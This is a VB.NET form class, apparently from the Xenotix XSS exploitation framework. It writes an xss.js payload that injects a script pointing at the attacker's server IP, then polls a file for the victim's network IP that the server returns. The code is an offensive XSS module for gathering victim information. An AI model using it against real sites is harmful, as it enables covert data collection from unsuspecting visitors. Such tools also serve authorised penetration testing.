Imports System.IO

Public Class xss_info_networkip

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(750, 800)
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        stream.WriteLine("if (document.getElementById('xenotix_netw" & Str(tmp) & "') == null){ ")
        stream.WriteLine(TextBox2.Text.Replace("[XENOTIX_SERVER]", xss_server.server_ip))
        stream.WriteLine(" script = document.createElement('script');script.id = 'xenotix_netw" & Str(tmp) & "'; document.body.appendChild(script); }")

        stream.Close()

        Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\ip.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then
            TextBox1.Text = line
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("ip.txt")
        Me.Close()
    End Sub

    Private Sub xss_networkip_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        TextBox2.Visible = False
        IO.File.Delete("ip.txt")
    End Sub
End Class